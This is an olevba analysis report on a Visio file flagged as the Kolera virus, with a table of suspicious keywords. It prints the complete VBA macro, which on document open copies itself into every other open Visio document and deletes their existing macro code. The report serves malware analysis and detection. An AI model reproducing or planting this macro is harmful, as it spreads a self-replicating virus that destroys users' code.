olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSVisio.Kolera-c94eb51648b9b68f1666f2d258ad95d77114e7f8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSVisio.Kolera-c94eb51648b9b68f1666f2d258ad95d77114e7f8 - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Kolera
Private Sub Document_DocumentOpened(ByVal doc As IVDocument)
broj_koda = ThisDocument.VBProject.vbcomponents(1).codemodule.countoflines
nas_kod = ThisDocument.VBProject.vbcomponents(1).codemodule.lines(1, broj_koda)
For i = 1 To Documents.Count
If Documents(i).VBProject.vbcomponents(1).codemodule.lines(1, 1) <> "'Kolera" Then
bk_zrtve = Documents(i).VBProject.vbcomponents(1).codemodule.countoflines
With Documents(i).VBProject.vbcomponents(1).codemodule
.deletelines 1, bk_zrtve
.insertlines 1, nas_kod
End With
End If
Next i
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

